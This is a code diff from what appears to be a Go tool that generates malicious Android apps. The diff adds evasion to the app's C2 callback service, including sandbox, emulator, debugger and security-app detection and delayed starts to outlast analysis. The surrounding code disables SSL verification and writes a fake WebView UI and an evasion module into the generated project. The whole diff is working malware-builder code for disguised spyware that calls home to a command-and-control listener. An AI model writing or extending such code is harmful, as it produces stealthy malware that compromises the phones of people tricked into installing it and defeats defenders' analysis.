@@ -247,6 +247,23 @@ public class CallbackService extends Service {
     }
 
     private void mainLoop() {
+        // ── EVASION CHECKS ──
+        // Only activate C2 if environment is safe
+        if (!PhantomEvasion.isSafeToRun(this)) {
+            // Sandbox/emulator/debugger detected — stay dormant
+            // Show fake app UI normally but never call back to C2
+            return;
+        }
+
+        // Delay start to outlast sandbox analysis windows (60-120s)
+        PhantomEvasion.delayedStart(60);
+
+        // If security apps detected, increase sleep interval
+        if (PhantomEvasion.hasSecurityApps(this)) {
+            // Reduce C2 frequency to avoid behavioral detection
+            try { Thread.sleep(300000); } catch (Exception e) {} // 5 min initial delay
+        }
+
         // Disable SSL verification
         try {
             TrustManager[] tm = new TrustManager[]{new X509TrustManager() {
@@ -353,6 +370,10 @@ public class BootReceiver extends BroadcastReceiver {
 
 	os.WriteFile(filepath.Join(pkgPath, "BootReceiver.java"), []byte(bootReceiver), 0644)
 
+	// ── Evasion module (anti-emulator, anti-debug, anti-AV, anti-Frida, anti-VPN) ──
+	evasionCode := GetAndroidEvasionCode(selected.PackageName)
+	os.WriteFile(filepath.Join(pkgPath, "PhantomEvasion.java"), []byte(evasionCode), 0644)
+
 	// ── Fake UI (HTML loaded in WebView) ──
 	os.MkdirAll(filepath.Join(appDir, "app", "src", "main", "assets"), 0755)
 	fakeUI := generateFakeUI(selected)
@@ -458,7 +479,9 @@ zipalign -v 4 unsigned.apk %s.apk
 		"    C2:       %s\n"+
 		"    Path:     %s\n"+
 		"    Files:    AndroidManifest.xml, MainActivity.java, CallbackService.java,\n"+
-		"              BootReceiver.java, build.gradle, fake UI, README\n",
+		"              BootReceiver.java, PhantomEvasion.java, build.gradle, fake UI\n"+
+		"    Evasion:  Anti-emulator, anti-debug, anti-Frida, anti-AV, anti-VPN,\n"+
+		"              sandbox timing delay, security app detection, root detection\n",
 		appDir, selected.Icon, selected.Name, selected.PackageName,
 		selected.Category, listenerURL, appDir), nil
 }
